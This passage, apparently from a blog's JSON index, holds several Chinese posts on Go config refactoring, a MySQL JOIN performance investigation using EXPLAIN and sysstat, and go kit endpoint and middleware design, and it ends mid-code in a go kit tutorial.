误用滥用问题无法完全解决，需要进一步对配置项分析，提取出公共配置和独属于服务的配置。这也会造成新的问题：如何兼顾配置的中心化访问模式（保持config.GetXxx这种足够简单清楚的访问方式，不会在业务代码里出现globalConfig和privateConfig两个配置源）和私有配置防误用滥用？  整体方案如下：\n 原本的全局变量全部改成 GetXxx() \u0026lt;type\u0026gt; 形式定义。 实现一个config包，定义ConfigReader接口和初步实现，再给一个全局默认 ConfigReader ，方便直接用 config.GetString(key) 的形式读配置，降低使用门槛。ConfigReader的实现内用一个标准map和sync.RWMutex管理配置项缓存，降低读操作的成本。  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  type ConfigReader interface { GetString(key string) (string, error) GetInt(key string) (int, error) GetInt32(key string) (int32, error) GetInt64(key string) (int64, error) GetUint(key string) (uint, error) GetUint32(key string) (uint32, error) GetUint64(key string) (uint64, error) GetFloat32(key string) (float32, error) GetFloat64(key string) (float64, error) GetBytes(key string) ([]byte, error) GetDuration(key string) (time.Duration, error) GetBool(key string) (bool, error) MustGetString(key string) string MustGetInt(key string) int MustGetInt32(key string) int32 MustGetInt64(key string) int64 MustGetUint(key string) uint MustGetUint32(key string) uint32 MustGetUint64(key string) uint64 MustGetFloat32(key string) float32 MustGetFloat64(key string) float64 MustGetBytes(key string) []byte MustGetDuration(key string) time.Duration MustGetBool(key string) bool }   以及配置提供者：\n1 2 3 4 5 6 7 8 9 10 11  type ConfigProvider interface { Lookup(key string) ([]byte, bool) Get(key string) ([]byte, error) Set(key string, val []byte) error Delete(key string) error // is config provider support change detection \tCanWatch() bool // Optional, implementation may return nil chan \tWatch(ctx context.Context) \u0026lt;-chan Change }   最终指定 Provider 来创建 ConfigReader 实例。\n这个方案存在一个比较麻烦的问题：原始的全局变量并不都是 string 类型，而是夹杂了 int、int64、bool，初始化时有的是用了封装好的 GetEnv ，有的使用 os.Getenv()、strconv.Atoi 等。将原本的全局变量替换成 GetXxx 并不是一件简单的事——如果手动来的话。\n幸好，Go 提供了 go/parser，只需要写大概一两百行代码，处理下 GenDecl 和 AssignStmt，找出配置项，然后用 dave/jennifer 生成对应的 Go 代码即可，最终生成 700多行代码，手工调整下部分结果就算完成了。\n至于业务代码中的调用点，可以直接在 vscode 里全局正则表达式搜索 \\benv.(\\w+)\\b 替换。\n至此，配置管理有了更多的可能。\n效果评估  以较低的成本实现了重构 灵活性显著提高，有了迁移配置源到其他存储服务中的可能 解决了其他服务的私有配置加载失败也会导致崩溃的问题 尚未完全解决配置编辑不便的问题：对于配置迁移到 etcd/consul 等平台，还需要进一步调研选型、决定是改用 viper 还是自行在 etcd/consul driver 上实现一个 provider 。 未解决误用滥用问题，仍需考虑如何兼顾中心化访问和私有配置隔离。  总结 两项重构的成本均在可控范围内，最终结果只能说勉强，还算是在预期内可接受。距离完全解决痛点仍然有不短的路要走。\n真正高价值的重构，比如建立缓存机制，还是需要对相关业务进一步研究理解和思考。\n","date":"2022-04-01T12:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/refactoring-transaction-and-config-management-note/","title":"记一次重构事务管理和配置管理"},{"content":"前言 长话短说，这个性能问题是上周修一个bug的时候企图偷懒引入的。因为 xorm 在连接查询的时候模型结构必须是和 join 的顺序保持一致，中间还不能有遗漏，不然查询结果填充到结构里的时候就会错位。\n而业务里这个条件又是可选的——用户不传的时候不需要 INNER JOIN；但为了让 xorm 开心，同时尽量别把整个函数签名和返回类型都改了把影响范围搞太大，所以就偷了个懒：既然 xorm 要 JOIN ，那就 LEFT JOIN加个恒假的条件呗。于是就顺手写下了下面的代码。\n1  LEFTJOINtblON1\u0026lt;\u0026gt;1  没啥问题对吧？我当时也这么想的。\n问题 好了，问题来了。先把整个 SQL写下来。\n1 2 3 4 5 6 7 8 9 10  SELECT*FROMaINNERJOINbONa.resource_id=b.idLEFTJOINcON1\u0026lt;\u0026gt;1LEFTJOINdONd.resource_id=a.resource_idLEFTJOINeONe.resource_id=a.resource_idWHEREa.result!=4ANDb.resource_type=2limit10offset0;  整个查询的实际耗时是 919ms。\nwhy ?\n性能分析 查询慢了第一反应还是是不是没索引，于是先看看 explain 的结果。\n   id select_type table partitions type possible_keys key key_len ref rows     1 SIMPLE a  ALL IDX_a_resource_id    456   1 SIMPLE b  eq_ref PRIMARY PRIMARY 8 a.resource_id 1   1 SIMPLE d  ref IDX_d_resource_id IDX_d_resource_id 8 a.resource_id 1   1 SIMPLE e  ref IDX_e_resource_id IDX_e_resource_id 9 a.resource_id 1   1 SIMPLE c  ALL     6405    驱动表是 a，做了全表扫描，但数据量很小，只有400多行。但这个表是只增的，全表扫描还是不太对劲，于是看了眼索引，发现 result 没有索引——但这个字段区分度不算很高，只有4个枚举值。\n网上随便搜的博客看到列区分度计算可以用 SELECT count(distinct col)/count(*) FROM tbl 来计算，区分度越接近 1 则索引效果越好。result的区分度只有0.0088，个人感觉区别不大。这种情况下使用result索引滤出来的结果集会比较大，回表查询次数过多的话还不如就遍历一遍原表。\n想归想，但还是老实加上了 result 索引，再 explain 了一次，结果是 possible keys 里多了 IDX_a_result，但最 type 还是 ALL，说明确实和 result 字段有没有索引没关系。\n再接着看下面，其他表基本不是主键就是二级索引，唯独 c 表特立独行——也是ALL。但这个表的 JOIN 子句是这样的。\n1  LEFTJOINcON1\u0026lt;\u0026gt;1  这为啥要遍历？\n但看到 cost 只有 87.68，又松了口气，可能只是 explain 输出不对吧，怎么想 ON 1 \u0026lt;\u0026gt; 1 这样的条件也应该是常数时间内完成。\n到这里，思路已经完全走歪了，开始觉得是不是磁盘 IO 或者网络 IO 上有瓶颈？\nsysstat 工具 这里介绍下一个很好用的 Linux 下性能分析工具，sysstat。大部分发行版都可以直接用内置包管理器安装，如 Debian/Ubuntu 可以用 apt-get install sysstat 安装。\nsysstat 包含了各种在Unix、Linux环境下通用的工具，来监视系统性能和使用情况。这里面有很多好用的工具比如 sar、iostat、pidstat。\n安装sysstat之后还需要配置。\n1  sudo dpkg-reconfigure sysstat   然后选 yes 来启用定时任务自动收集数据到 /var/log/sysstat ，这样 sar 就可以导出报告了。\nsar 是一个综合性的工具，可以收集、导出、保存系统活动数据，收集的数据包括：I/O、CPU、物理内存/Hugepage/Swap、虚拟内存、进程创建、中断、网络接口、socket、等等\u0026hellip;非常全面，基本能想到的都有。\n放在这个场景里，用 sar 可以看到运行查询时的磁盘使用情况：sudo sar -bd 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  14时48分14秒 tps rtps wtps dtps bread/s bwrtn/s bdscd/s 14时48分15秒 40.00 1.00 39.00 0.00 8.00 312.00 0.00 14时48分14秒 DEV tps rkB/s wkB/s dkB/s areq-sz aqu-sz await %util 14时48分15秒 dev7-0 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-1 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-2 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-3 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-4 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-5 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-6 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-7 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev8-0 40.00 4.00 156.00 0.00 4.00 0.00 0.20 2.00 14时48分15秒 dev253-0 42.00 4.00 156.00 0.00 3.81 0.00 0.00 2.00 14时48分15秒 dev7-8 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00 14时48分15秒 dev7-9 0.00 0.00 0.00 0.00 0.00 0.00 0.00 0.00   不能说毫无波动，但显然和瓶颈应该扯不上关系了。但出于谨慎考虑，还是用 pidstat 指定了 mysqld 进程的 PID 来观察。这里多嘴一句，MySQL 是用 kubernetes 部署在办公室的服务器上的，我得提一嘴 sysstat 是在宿主机上直接运行而不是容器里——这得说到容器隔离的原理，namespace和cgroup，在外层namespace下是可以看到内层namespace的进程的，但内层的namespace看不到外层，是单向的隔离。所以可以直接在宿主机上用 ps 看到 pause 容器的进程以及 mysqld 这种容器里的进程，也可以收集到各种使用率信息——因为共享宿主机的内核嘛。\n1  pidstat -d -p 11404 1   1 2 3 4 5 6  14时57分19秒 UID PID kB_rd/s kB_wr/s kB_ccwr/s iodelay Command 14时57分20秒 999 11404 -1.00 -1.00 -1.00 0 mysqld 14时57分21秒 999 11404 -1.00 -1.00 -1.00 0 mysqld 14时57分22秒 999 11404 -1.00 -1.00 -1.00 0 mysqld 14时57分23秒 999 11404 -1.00 -1.00 -1.00 0 mysqld 14时57分24秒 999 11404 -1.00 -1.00 -1.00 0 mysqld   这就只能说毫无波动了，说那么多，并没有卵用。\n转折 一上午几乎都花费在这个查询上，终于在一次胡乱分析中注意到 CPU 使用率不同寻常：pidstat -p 11404 -d 1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  15时01分01秒 UID PID %usr %system %guest %wait %CPU CPU Command 15时01分02秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld 15时01分03秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld 15时01分04秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld 15时01分05秒 999 11404 0.00 0.00 0.00 0.00 0.00 1 mysqld 15时01分06秒 999 11404 6.00 0.00 0.00 0.00 6.00 1 mysqld 15时01分07秒 999 11404 39.00 0.00 0.00 0.00 39.00 1 mysqld 15时01分08秒 999 11404 52.00 0.00 0.00 0.00 52.00 1 mysqld 15时01分09秒 999 11404 65.00 0.00 0.00 0.00 65.00 1 mysqld 15时01分10秒 999 11404 53.00 0.00 0.00 0.00 53.00 1 mysqld 15时01分11秒 999 11404 66.00 0.00 0.00 0.00 66.00 6 mysqld 15时01分12秒 999 11404 85.00 0.00 0.00 0.00 85.00 6 mysqld 15时01分13秒 999 11404 5.00 0.00 0.00 0.00 5.00 6 mysqld 15时01分14秒 999 11404 0.00 0.00 0.00 0.00 0.00 6 mysqld   在运行查询时，CPU使用率飙升到了50%~85%，一个简单的查询几乎跑满了一个核心？如果 ctrl+enter 按得稍微勤快一点，这个使用率最高能跑到 105% ——这还是因为我在 kubernetes 只给了 1 CPU 的配额的缘故。于是瓶颈终于暴露了出来：CPU。这谁能想到呢。\n再回过头分析查询，结合一下脑子里沉睡已久的记忆+谷歌一下，问题终于浮出水面。\n对，nested_loop#5，MySQL 的执行计划忠实反映了实际做的事情。MySQL 真就，对着 LEFT JOIN ... ON 1 \u0026lt;\u0026gt; 1 这个条件，在嵌套循环里，做了个全表扫描\u0026hellip;\u0026hellip;\n所谓nested_loop，就是for range { for range {}} 这样的执行路径，简单地把 Rows 乘一下就能得到实际处理了多少行：6450*456=2920680，一共 292 万行，难怪 CPU 使用率会如此之高，难怪数据量这么小的两个表做查询居然会花费接近1s的时间。\n解决 知道了瓶颈，找到了造成瓶颈的代码，那么应该就好解决了——话虽如此，要我给出解决办法的话确实就是一句话的事情，但为了找出这个解决办法反而浪费了不少时间。\n回顾造成问题的 JOIN 子句，LEFT JOIN ... ON 1 \u0026lt;\u0026gt; 1，1 \u0026lt;\u0026gt; 1 是恒假条件，但 MySQL 对这个条件选择了全表扫描这种完全无法理解的处理方式。\n行，那我直接改成 ON FALSE，总不至于连 FALSE 也能给个全表扫描的执行计划吧？对，还真能，MySQL 真有你的\u0026hellip;\n随后还试了 0 \u0026gt; 1、1 \u0026lt; 0、1=2、1 is null 等等条件，无一例外 MySQL 的执行计划都是 nested_loop + 全表扫描，就在快放弃的时候偶然想到既然说什么都要扫表，那我让 MySQL 扫就是了，给个有索引的字段让 MySQL 不要全表扫描，也能改善很多吧？然后就随手写下 c.id=-1。\n然后 MySQL 的执行计划就从全表扫描变成了常数时间\u0026hellip;真有你的啊 MySQL！\n又试了下 c.id is null 同样也是常数时间，所以MySQL犯傻的原因是优化器没考虑到有我这样的 聪（臭）明（傻）人（B） 会往条件里写个 FALSE 是吧\u0026hellip;真有你的啊 MySQL！\n总结 不要忽略 explain 给出的线索。 注意 nested_loop，join 的条件不能太宽泛，否则遍历的数据量会爆炸性增长，后果就是查询时间随随便便翻几百倍。  最高效的 join 当然是直接走主键，查一个元素，聚簇索引，不用回表，查询时间复杂度不变。 次一级的走二级索引，查一个元素，回表一次也就完了，查询时间复杂度不变。 再次一级的索引区分度不足1，查找出来多个元素，回表多次，嵌套循环的话会成倍放大驱动表的时间复杂度。 最差的情况，索引区分度太差或者没索引，被迫嵌套循环+全表扫描，也就是我碰到的情况，生产下负载提上来一点就大概率要GG。   MySQL 的优化器需要在条件里给个列，就算是恒真或者恒假的条件，也一定要给个列，不然MySQL就会跟个傻逼一样选择全表扫描。  我的环境是 MySQL 5.7.33，InnoDB 5.7.33，MySQL Community Server，新版本 MySQL 不知道有没有解决。   sysstat 这套工具很好用，如果没把可观测性的基础设施(各种reporter+prometheus+grafana)搞好的话，sysstat 值得拥有。  ","date":"2022-03-14T12:30:00+08:00","image":"https://nnnewb.github.io/blog/p/note-of-mysql-join-optimize/image-20220314150141759_hu8ccdbbcbbb5906798b24061f7093764d_181309_120x120_fill_box_smart1_3.png","permalink":"https://nnnewb.github.io/blog/p/note-of-mysql-join-optimize/","title":"记一次MySQL JOIN优化"},{"content":"前言 这是看了 Go kit: the road ahead 之后，对 go kit 这套抽象的一些想法。主要是关于 endpoint 是否有必要、generic 会如何影响 go kit 的架构、go kit 的代码生成这些问题。\nendpoint 抽象层是否必要存在 我的看法是需要。原因下面分析。\n一个没有额外功能的 Endpoint 其实是起到了把请求类型适配到 Go 函数签名的作用。stringsvc 实现如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  import ( \u0026#34;context\u0026#34; \u0026#34;github.com/go-kit/kit/endpoint\u0026#34; ) func makeUppercaseEndpoint(svc StringService) endpoint.Endpoint { return func(_ context.Context, request interface{}) (interface{}, error) { req := request.(uppercaseRequest) v, err := svc.Uppercase(req.S) if err != nil { return uppercaseResponse{v, err.Error()}, nil } return uppercaseResponse{v, \u0026#34;\u0026#34;}, nil } } func makeCountEndpoint(svc StringService) endpoint.Endpoint { return func(_ context.Context, request interface{}) (interface{}, error) { req := request.(countRequest) v := svc.Count(req.S) return countResponse{v}, nil } }   对于写过 rpcx 或者 gRPC 的朋友来说，Endpoint 更像是个脱裤子放屁的封装。只要把接口参数约定成 func (ctx context.Context, req interface{}) (interface{}, error) 不就完了？传输层收到的请求解码成本地数据类型，然后按约定传入，就万事大吉了。\n空口无凭，不如看看如果不要 endpoint，实际编写的代码会变成什么样。\n像是 go kit 提供的这种帮助函数：\n1 2 3 4 5 6 7 8 9 10 11  uppercaseHandler := httptransport.NewServer( makeUppercaseEndpoint(svc), decodeUppercaseRequest, encodeResponse, ) countHandler := httptransport.NewServer( makeCountEndpoint(svc), decodeCountRequest, encodeResponse, )   可能就会变成这样：\n1 2 3 4 5 6 7 8 9 10 11  uppercaseHandler := httptransport.NewServer( svc.Uppercase, decodeUppercaseRequest, encodeResponse, ) countHandler := httptransport.NewServer( svc.Count, decodeCountRequest, encodeResponse, )   当然，为了让 Go 语言的类型系统开心，这里的 svc.Uppercase 和 svc.Count 得是一样的签名，或者用 interface{} 做形参，又或者考虑还没有发布的泛型能不能支持。\n看起来是舒服了很多对吧？Endpoint 没了。但还有个问题：中间件。要怎么实现通用的中间件，应用在每个原本应该是 Endpoint 的地方？\n例如在微服务系统里很常见的分布式跟踪、metrics收集，无论最终采用的是 opentracing、opencecus、opentelemetry 还是 zipkin、prometheus，跟踪调用链路是一个很基本的可观测性要求。当然，你可以说用 linkerd 一类的 service mesh 解决方案（虽然我觉得不能替代上面提到的这些东西），但也应该有所警惕：我们是不是还有需要在每个接口上都执行、和传输层无关的代码？对，还有身份验证和鉴权工作。还有吗？\n当然，也不是脱离了 Endpoint 就别无他法，只是在需要的时候，我想总还是会有意无意抽象出一个类似 endpoint 的层级——可能隐藏在 service 中间件里，也可能交给了传输层。可能写得更好，也可能又是在堆屎山。经验告诉我在一个需要长期支持的系统里，人是靠不住的，但规范可以。endpoint 并没有牺牲多少编码上的自由度，但一定程度上避免了潜在的堆屎可能，我觉得完全可以接受。\ngeneric 会如何影响 go kit 架构 我直说，Go 的泛型（beta1）就是一泡狗屎，我向来不喜欢 Go 团队的品味，从 slice 和 interface{} 泄露语言的实现细节到其他更离谱的东西。但现在 Go 泛型还没有正式公布（预期就在本月），现在我也没什么好评论的。\ngeneric 会影响 go kit 的架构吗？我的看法是不会。泛型也许能极大帮助各种容器类型、迭代器之类饱受 interface{} 折磨的组件，但是 go kit 用得上泛型的地方其实不多。少数常见的 interface{} 场合，都是在从一个类型适配到另一个类型，代码编写者清楚自己要处理的两个类型，但 go kit 不知道。\n1 2 3 4 5 6 7 8 9 10  func makeUppercaseEndpoint(svc StringService) endpoint.Endpoint { return func(_ context.Context, request interface{}) (interface{}, error) { req := request.(uppercaseRequest) v, err := svc.Uppercase(req.S) if err != nil { return uppercaseResponse{v, err.Error()}, nil } return uppercaseResponse{v, \u0026#34;\u0026#34;}, nil } }   这部分适配代码如果把 interface{} 替换成具体的 uppercaseRequest 和 uppercaseResponse 的话，就需要 go kit 提供泛型形式的 Endpoint 接口了，像是这样：\n1  type Endpoint[RequestType,ResponseType] = func(context.Context, RequestType) (ResponseType, error)   上面的代码有效无效先不说，我记得在 beta1 尝试泛型的时候发现 Go 在推断类型的时候存在问题，这个 RequestType 和 ResponseType 在实际用的时候怕是要写不止一次。又是 Go 特色的啰嗦。\n可即便是这样恐怕还有问题，如果修改了 Endpoint 的签名，那么 endpoint.Middleware 恐怕也要泛型化，原来的所有中间件库，trace、auth、metrics 可能也得做泛型化改造。对一个已经深度开发过的系统来说，为了这一点类型检查的好处付出如此代价恐怕是不能接受的。\n总而言之，我的观点是 Generic 可能带来变化，但根本上的几个抽象不大可能跟着重构，这是由 go kit 性质决定的。\ngo kit 代码生成 但凡跟着 go kit 写过一个 stringsvc 的人都会感觉到 go kit 有多少样板代码，适配传输层需要编写 encode/decode，本地结构转函数签名所需的参数又要一次转换，传输层协议监听、注册Handler、客户端连接都要自己编写代码，构造和注册 Endpoint 复杂性无非是从 func main 移动到 transport 或者反过来，尽管很烦，但又无法根本上消除。\n如果是 C++ 恐怕会有模板元编程大佬晒自己的 template，但 Go 基本没有编译时和运行时的元编程能力。唯一比较擅长的就只有个代码生成了。Go 提供的 ast/parser 包很赞，别的语言少有提供这么方便的接口的。\ngo kit 的代码生成，从目前体验中感受来看，主要是需要下面的功能：\n 从 interface 定义生成对应的 makeEndpoint 函数和请求/响应结构体。这部分代码基本没什么特别的。 从 interface 定义生成对应的 transport 包，可以自己选择协议。主要解决 encode/decode 手写麻烦的问题。 从 interface 定义生成服务构造和启动代码，应用可以自己构造，但 endpoint 的构造和 middleware 的应用就可以不用自己写了。  这三处的样板代码最多，而且代码本身并不特别，都是简单地对类型进行适配，手写完全是浪费时间，还会引入人为的不确定性，不如让机器搞定。目前考察过的 kit 实现了其中一大部分，但 transport 支持太少，也没有生成注册 endpoint 的代码，依然存在很多手写的样板代码。我简单看了下实现，用 jennifer 生成代码好是挺好，就是 go 代码显得有点乱 \u0026hellip;\n我寻思对 generator 简单重构下实现关注点分离的话，还是能满足上面提到的这些东西的。最好的情况是定义好 interface 之后，生成代码，编写主函数，就能直接运行了。同时又不伤害 go kit 架构本身的扩展性和可定制性。\n总结 蛮喜欢 go kit 项目作者的一句话：\n Honestly the best way to \u0026ldquo;use\u0026rdquo; Go kit is to cop it\u0026rsquo;s architectural model and not actually import any of its packages at all 😉\n 其实我也想把这套架构搬进项目里，可惜条件不允许，还有更严重的问题要处理，只能先眼馋一下，吸收下精神。\n","date":"2022-03-02T12:30:00+08:00","permalink":"https://nnnewb.github.io/blog/p/my-opinion-of-gokit-architecture/","title":"gokit 架构之我见"},{"content":"前言 初步看了下 gokit 的案例 stringsvc和apigateway，记录一下对 gokit 的映像。\ngokit定位  Go kit is a programming toolkit for building microservices (or elegant monoliths) in Go. We solve common problems in distributed systems and application architecture so you can focus on delivering business value.\nGo has emerged as the language of the server, but it remains underrepresented in so-called \u0026ldquo;modern enterprise\u0026rdquo; companies like Facebook, Twitter, Netflix, and SoundCloud. Many of these organizations have turned to JVM-based stacks for their business logic, owing in large part to libraries and ecosystems that directly support their microservice architectures.\nTo reach its next level of success, Go needs more than simple primitives and idioms. It needs a comprehensive toolkit, for coherent distributed programming in the large. Go kit is a set of packages and best practices, which provide a comprehensive, robust, and trustable way of building microservices for organizations of any size.\n gokit 大概算是框架，因为和 gokit 打交道基本离不开 gokit 定义的几个接口类型。用 gokit 开发服务的可定制性很强，几乎每个细节都可以控制。\n而实际上手体验下来，缺点大概就是海量的样板代码，实现一个服务需要大量的适配代码来控制 Endpoint 。又因为 Go 语言表现力不足，也没有运行时元编程的能力，这些样板代码只能靠代码生成来解决。\n还好 gokit 自己也知道，在仓库首页就提供了很多代码生成器的链接。\n用 gokit 还有一个好处是一定程度上避免技术栈绑定在某个特定平台或者框架上，毕竟 gokit 比起框架，更像是一个工具箱，组件之间没有特别的依赖关系，顺手就用，不顺手可以换个锤子。\n框架搭建 鸟瞰 gokit 编写的服务有几个基本元素，这些基本元素都是围绕 Endpoint 接口转的，gokit 自己把 Endpoint 称为 构建服务器和客户端的基本块 。\n几个基本元素是：\n 服务接口定义 type StringService interface { /*...*/ } 应用级中间件定义 type AppMiddleware struct {} // implement StringService 传输层接口定义，包括 Endpoint 定义、序列化、服务发现等 传输层中间件定义，type Middleware func(Endpoint) Endpoint  此外还有一些可选的组件：\n tracing，分布式跟踪 ratelimit，限流 metrics，指标收集 log，日志收集 circuitbreaker，熔断 auth，身份认证  我自己整的目录结构如下。\n服务本质是一系列接口的集合，gokit 的 tutorial 中将服务抽象成了一个 interface ，在这个接口上用户可以提供不同实现。像是服务端、客户端、中间件，不管传输层怎么定义，最终实现的都是这个接口。\n1 2 3 4  type StringService interface { Uppercase(string) (string, error) Count(string) int }   微服务的开发者提供这个接口的实现。\n1 2 3 4 5 6 7 8 9 10 11 12  type StringServiceImpl struct{} func (s *StringServiceImpl) Uppercase(arg string) (string, error) { if arg == \u0026#34;\u0026#34; { return \u0026#34;\u0026#34;, nil } return strings.ToUpper(arg), nil } func (s *StringServiceImpl) Count(arg string) int { return len(arg) }   然后通过某种传输层协议暴露给调用方。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  func MakeUppercaseEndpoint(svc stringsvc1.StringService) endpoint.Endpoint { return func(ctx context.Context, request interface{}) (interface{}, error) { req := request.(UppercaseRequest) v, err := svc.Uppercase(req.S) if err != nil { return nil, err } return \u0026amp;UppercaseResponse{ V: v, }, nil } } // ... 略  func main() { logger := log.NewLogfmtLogger(os.Stderr) svc := \u0026amp;stringsvc1.StringServiceImpl{} uppercase := transport.MakeUppercaseEndpoint(svc) uppercaseHandler := httptransport.NewServer(uppercase, transport.DecodeUppercaseRequest, transport.EncodeResponse) http.Handle(\u0026#34;/uppercase\u0026#34;, uppercaseHandler) count := transport.MakeCountEndpoint(svc) countHandler := httptransport.NewServer(count, transport.DecodeCountRequest, transport.EncodeResponse) http.Handle(\u0026#34;/count\u0026#34;, countHandler) logger.Log(\u0026#34;msg\u0026#34;, \u0026#34;HTTP\u0026#34;, \u0026#34;addr\u0026#34;, \u0026#34;:8080\u0026#34;) logger.Log(\u0026#34;err\u0026#34;, http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil)) }   一个简单的服务提供方需要做的就是这些。下面具体看看其中涉及的概念。\nendpoint 解析 一个最简单的服务 Endpoint 定义如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51  package main import ( \u0026#34;context\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;strings\u0026#34; httptransport \u0026#34;github.com/go-kit/kit/transport/http\u0026#34; \u0026#34;github.com/go-kit/log\u0026#34; ) type uppercaseRequest struct { S string `json:\u0026#34;s,omitempty\u0026#34;` } type uppercaseResponse struct { S string `json:\u0026#34;s,omitempty\u0026#34;` } func main() { logger := log.NewLogfmtLogger(os.Stderr) http.Handle(\u0026#34;/uppercase\u0026#34;, httptransport.NewServer( // endpoint 定义 \tfunc(ctx context.Context, request interface{}) (response interface{}, err error) { req := request.(uppercaseRequest) if req.S == \u0026#34;\u0026#34; { return uppercaseResponse{\u0026#34;\u0026#34;}, nil } return uppercaseResponse{strings.ToUpper(req.S)}, nil }, // 请求 decoder \tfunc(c context.Context, r *http.Request) (interface{}, error) { var request uppercaseRequest if err := json.NewDecoder(r.Body).Decode(\u0026amp;request); err != nil { return nil, err } return request, nil }, // 响应 encoder \tfunc(c context.Context, w http.ResponseWriter, response interface{}) error { return json.NewEncoder(w).Encode(response) }, )) logger.Log(\u0026#34;msg\u0026#34;, \u0026#34;HTTP\u0026#34;, \u0026#34;addr\u0026#34;, \u0026#34;:8080\u0026#34;) logger.Log(\u0026#34;err\u0026#34;, http.ListenAndServe(\u0026#34;:8080\u0026#34;, nil)) }   Endpoint 本质是一个函数，类型签名如下。\n1 2 3  // Endpoint is the fundamental building block of servers and clients. // It represents a single RPC method. type Endpoint func(ctx context.Context, request interface{}) (response interface{}, err error)   Endpoint 抽象了 RPC 调用，隐藏了调用对象是“本地”还是“远程”的。像是上面的案例里，Endpoint 背后是本地的代码。而在客户端使用Endpoint时，Endpoint的背后往往是传输层代码，发起了一次远程调用。\nEndpoint 本身不做请求/响应的编解码工作，进入 Endpoint 的都是已经准备好的结构化数据。\nendpoint.Middleware 解析 endpoint.Middleware 是在 Endpoint 上包装的中间件，签名如下。\n1 2  // Middleware is a chainable behavior modifier for endpoints. type Middleware func(Endpoint) Endpoint   和 gin 之类的框架中间件体系很相似，都是基于高阶函数的方式。一个简单的日志中间件实现如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import ( \u0026#34;context\u0026#34; \u0026#34;github.com/go-kit/kit/endpoint\u0026#34; \u0026#34;github.com/go-kit/log\u0026#34; ) func LoggingMiddleware(logger log.Logger) endpoint.Middleware { return func(next endpoint.Endpoint) endpoint.Endpoint { return func(ctx context.Context, request interface{}) (interface{}, error) { logger.Log(\u0026#34;msg\u0026#34;, \u0026#34;calling endpoint\u0026#34;) defer logger.Log(\u0026#34;msg\u0026#34;, \u0026#34;called endpoint\u0026#34;) return next(ctx, request) } } }   像这样定义的中间件用法也很简单，以 Endpoint 为参数调用即可。\n1  LoggingMiddleware(log.With(logger, \u0026#34;method\u0026#34;, \u0026#34;method-name\u0026#34;))(endpoint)   说起这个我就怀念 python 的装饰器。\n应用中间件 应用中间件不算是 gokit 的一部分，gokit 的示例中给出了应用级中间件的做法。实话说我不喜欢。\n所谓的应用中间件做法其实就是再定义一个结构，实现你的服务接口，然后在实现的服务接口里加上需要的中间件代码。\n如果要说有什么好处的话，就是满足了类型约束，免去了用 reflect。Endpoint一级的中间件只能拿到一个 request interface{} ，但下面这样写的话，参数就是已经填好的了，服务实现里拿到什么参数这个中间件就拿到什么参数。但问题也很明显——为了满足 type Service interface 的约束，这样的中间件必须把服务的所有接口都写个 stub 。就算是用编辑器的 generate interface stubs 功能也没法直接帮你填好转发参数的代码啊\u0026hellip;\n我自己倒是折腾出一个有点怪的解法，利用 go 的 embed 字段和动态分发机制，部分实现了有继承的语言里的 override 。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import ( \u0026#34;play/stringsvc1\u0026#34; \u0026#34;github.com/go-kit/log\u0026#34; ) type LoggingMiddleware struct { stringsvc1.StringService // LoggingMiddleware 自己没有实现全部的 stringsvc1.StringService 接口，但这个 embed 字段实现了 \tLogger log.Logger } // 这个实现覆盖掉了结构里的 stringsvc1.StringService.Uppercase 暴露的实现 // 然后内部又使用了 `.StringService.Uppercase` 这种语法来调用结构里的 // stringsvc1.StringService.Uppercase 实现 // 就像是有继承的语言里子类通过 super() 或者 ParentClass::Uppercase 这样的方式调用父类实现一样。 func (m *LoggingMiddleware) Uppercase(s string) (string, error) { m.Logger.Log(\u0026#34;msg\u0026#34;, \u0026#34;call endpoint\u0026#34;, \u0026#34;arg\u0026#34;, s) defer m.Logger.Log(\u0026#34;msg\u0026#34;, \u0026#34;called endpoint\u0026#34;, \u0026#34;arg\u0026#34;, s) return m.StringService.Uppercase(s) }   通过这种办法倒是实现了应用级的特定接口中间件。但还要另外定义一个 struct 也比较麻烦。\n贴一下示例里的代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  // middleware.go type loggingMiddleware struct { logger log.Logger next StringService } func (mw loggingMiddleware) Uppercase(s string) (output string, err error) { defer func(begin time.Time) { mw.logger.Log( \u0026#34;method\u0026#34;, \u0026#34;uppercase\u0026#34;, \u0026#34;input\u0026#34;, s, \u0026#34;output\u0026#34;, output, \u0026#34;err\u0026#34;, err, \u0026#34;took\u0026#34;, time.Since(begin), ) }(time.Now()) output, err = mw.next.Uppercase(s) return }   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  // main.go import ( \u0026#34;os\u0026#34; \u0026#34;github.com/go-kit/kit/log\u0026#34; httptransport \u0026#34;github.com/go-kit/kit/transport/http\u0026#34; ) func main() { logger := log.NewLogfmtLogger(os.Stderr) var svc StringService 